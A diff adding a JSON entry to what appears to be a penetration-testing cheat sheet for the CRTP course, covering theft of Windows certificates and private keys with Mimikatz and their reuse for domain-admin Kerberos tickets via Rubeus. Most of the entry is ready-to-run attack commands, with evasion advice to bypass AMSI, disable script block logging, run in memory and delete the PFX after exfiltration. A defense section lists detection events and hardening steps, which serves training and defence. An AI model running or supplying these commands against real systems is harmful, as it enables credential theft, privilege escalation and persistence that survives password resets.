@@ -1,0 +1,133 @@
+{
+  "id": "crtp-mimikatz-cert-export",
+  "name": "Mimikatz Certificate Theft (crypto::capi / crypto::cng)",
+  "command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export\"'",
+  "description": "Steal certificates AND their private keys from the current user and the local machine stores - even when the private key is marked non-exportable. crypto::capi patches CryptoAPI and crypto::cng patches the KeyIso (CNG) service in memory so that crypto::certificates /export can dump every certificate (with key) to PFX. Stolen client-auth certs enable PKINIT/Pass-the-Certificate authentication and long-lived persistence (valid until the cert expires, surviving password resets).",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Domain Persistence",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "loud",
+  "mitre": [
+    "T1649",
+    "T1552.004"
+  ],
+  "tools": [
+    "Mimikatz",
+    "SafetyKatz"
+  ],
+  "tags": [
+    "adcs",
+    "certificates",
+    "theft",
+    "mimikatz",
+    "pkinit",
+    "persistence",
+    "crypto"
+  ],
+  "steps": [
+    {
+      "label": "Patch CryptoAPI so CAPI keys become exportable",
+      "command": "Invoke-Mimikatz -Command '\"crypto::capi\"'"
+    },
+    {
+      "label": "Patch KeyIso (CNG) so CNG keys become exportable",
+      "command": "Invoke-Mimikatz -Command '\"crypto::cng\"'"
+    },
+    {
+      "label": "Export certs+keys from the CURRENT USER store",
+      "command": "Invoke-Mimikatz -Command '\"crypto::certificates /export\"'"
+    },
+    {
+      "label": "Export certs+keys from the LOCAL MACHINE store",
+      "command": "Invoke-Mimikatz -Command '\"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\"'"
+    },
+    {
+      "label": "Authenticate with a stolen client-auth cert (PKINIT)",
+      "command": "Rubeus.exe asktgt /user:<user> /certificate:<stolen>.pfx /password:mimikatz /ptt"
+    }
+  ],
+  "variations": [
+    {
+      "label": "One-shot: patch both providers + export both stores",
+      "command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export\" \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\"'"
+    },
+    {
+      "label": "Native mimikatz.exe (via Loader, in-memory)",
+      "command": "Loader.exe -path C:\\AD\\Tools\\mimikatz.exe -args crypto::capi crypto::cng \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\" exit"
+    },
+    {
+      "label": "List certificates before exporting",
+      "command": "Invoke-Mimikatz -Command '\"crypto::certificates\"'"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Dump machine-store certs (default password on PFX = mimikatz)",
+      "command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\"'"
+    },
+    {
+      "label": "Use exported cert for a DA TGT",
+      "command": "Rubeus.exe asktgt /user:administrator /certificate:C:\\AD\\Tools\\stolen-DA.pfx /password:mimikatz /ptt"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-invishell",
+      "note": "Bypass AMSI/logging before running Mimikatz",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-adcs-esc1",
+      "note": "Alternative: request a forged cert via ESC1 instead of stealing one",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-overpass-hash",
+      "note": "Use the cert/TGT for lateral movement",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Also dump LSASS creds while on the host",
+      "rel": "next"
+    }
+  ],
+  "notes": "Exported PFX files are protected with the default password 'mimikatz' unless changed. Machine-store export requires local admin/SYSTEM; current-user export runs in the user's context. Certificate-based persistence is powerful: a stolen client-auth certificate keeps working after the account's password is reset, until the certificate expires or is revoked. This is the THEFT1/THEFT4 path from the Certified Pre-Owned research. Run under InviShell / after an AMSI bypass - Invoke-Mimikatz is heavily signatured.",
+  "references": [
+    {
+      "title": "CRTP - Domain Persistence / AD CS",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "SpecterOps - Certified Pre-Owned (THEFT techniques)",
+      "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    },
+    {
+      "title": "MITRE T1649 - Steal or Forge Authentication Certificates",
+      "url": "https://attack.mitre.org/techniques/T1649/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Windows lets you flag a private key 'non-exportable', but that flag is enforced only in user mode by CryptoAPI/CNG. With local admin, Mimikatz patches those providers (crypto::capi / crypto::cng) in memory so the export path succeeds anyway, then exports every certificate with its private key. AD authentication certificates are as good as a password hash - and last until expiry.",
+    "prerequisites": "Local admin (current-user store) or SYSTEM (machine store) on the host holding the certificate. Mimikatz/SafetyKatz. A code-execution primitive plus AMSI/logging bypass to run it cleanly.",
+    "impact": "T1649 steal authentication certificates + T1552.004 private keys. Stolen client-auth certs enable PKINIT/Pass-the-Certificate as the cert's subject (often a privileged user or the machine account), and provide password-reset-surviving persistence.",
+    "misconfiguration": "Certificates issued with 'private key exportable' where unnecessary; privileged client-auth certs stored on general-purpose hosts; no monitoring of certificate export / Mimikatz execution; local admin over-provisioned.",
+    "vulnerable_config": "# Cert present in LocalMachine\\My with a client-auth EKU and a usable private key:\nGet-ChildItem Cert:\\LocalMachine\\My | ? { $_.HasPrivateKey } | select Subject,NotAfter,EnhancedKeyUsageList\n# Attacker with admin patches CAPI/CNG -> exports it regardless of the non-exportable flag",
+    "secure_config": "# Store keys in a TPM/HSM-backed KSP so they cannot be exported even by admin:\n#  - Issue certs with a hardware KSP (e.g. 'Microsoft Platform Crypto Provider')\n#  - Enrollment: 'Key Storage Provider' + require TPM; do NOT mark keys exportable\n# Reduce local admin footprint; put privileged certs only on hardened, tiered hosts.\n# CA hygiene: short validity, enable revocation (CRL/OCSP), monitor issuance.",
+    "detection": "Mimikatz on host: Event 4104 (crypto::certificates / crypto::capi / crypto::cng) if SBL enabled; Sysmon 10 (process access to lsass/keyiso) and Sysmon 7 (Mimikatz module loads). Certificate export events (CAPI2 Operational log Event 70/1001) and creation of unexpected .pfx files. MDE 'Certificate exported' / 'Mimikatz' analytics. Follow-on: 4768/4769 PKINIT logons from unusual hosts.",
+    "artifacts": "CAPI2 Operational Event 70 (private key export) | new .pfx files on disk | Event 4104 crypto:: commands | Sysmon 10 lsass/keyiso access | subsequent PKINIT 4768 (pre-auth type 16)",
+    "prevention": "Use non-exportable, TPM/HSM-backed keys (hardware KSP). Enforce tiered admin so attackers can't get admin on hosts holding privileged certs. Enable Script Block Logging + Sysmon. Enable certificate revocation and monitor CA issuance. Rotate/revoke certs on compromise (password reset alone is not enough).",
+    "evasion": "Run in-memory via Loader.exe/SafetyKatz to avoid on-disk AV; bypass AMSI + disable Script Block Logging first (InviShell); export to a non-obvious path; clear the .pfx after exfil.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1649/",
+      "https://attack.mitre.org/techniques/T1552/004/",
+      "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+      "CRTP Domain Persistence"
+    ]
+  }
+}
